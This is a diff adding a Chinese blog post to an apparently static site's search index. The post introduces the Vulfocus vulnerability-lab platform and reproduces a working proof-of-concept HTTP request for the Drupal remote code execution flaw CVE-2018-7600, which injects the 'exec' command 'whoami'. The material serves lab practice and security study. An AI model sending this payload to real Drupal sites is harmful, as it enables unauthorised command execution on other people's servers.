@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>vulfocus通过</title>
+      <link href="/archives/41783/"/>
+      <url>/archives/41783/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Vulfocus"><a href="#Vulfocus" class="headerlink" title="Vulfocus"></a>Vulfocus</h1><h2 id="演示地址：http-vulfocus-fofa-so"><a href="#演示地址：http-vulfocus-fofa-so" class="headerlink" title="演示地址：http://vulfocus.fofa.so/"></a>演示地址：<a href="http://vulfocus.fofa.so/" target="_blank" rel="noopener">http://vulfocus.fofa.so/</a></h2><p>docker 仓库：<a href="https://hub.docker.com/u/vulfocus" target="_blank" rel="noopener">https://hub.docker.com/u/vulfocus</a></p><p>源码：<a href="https://github.com/fofapro/vulfocus/" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus/</a></p><h2 id="Vulfocus的特性"><a href="#Vulfocus的特性" class="headerlink" title="Vulfocus的特性"></a>Vulfocus的特性</h2><ol><li>启动：一键漏洞环境启动，方便简单。</li><li>自带 Flag 功能：每次启动 flag 都会自动更新，明确漏洞是否利用成功。</li><li>带有计分功能也可适用于相关安全人员能力的考核。</li><li>兼容 <a href="https://vulhub.org/" target="_blank" rel="noopener">Vulhub</a>、<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">Vulapps</a> 中所有漏洞镜像。</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="Drupal远程代码执行漏洞-CVE-2018-7600"><a href="#Drupal远程代码执行漏洞-CVE-2018-7600" class="headerlink" title="Drupal远程代码执行漏洞(CVE-2018-7600)"></a>Drupal远程代码执行漏洞(CVE-2018-7600)</h4><p>POC</p><pre><code>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 103Connection: closeUpgrade-Insecure-Requests: 1form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=whoami</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 技术分享 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CVE-2020-0796本地提权</title>
       <link href="/archives/57083/"/>
       <url>/archives/57083/</url>
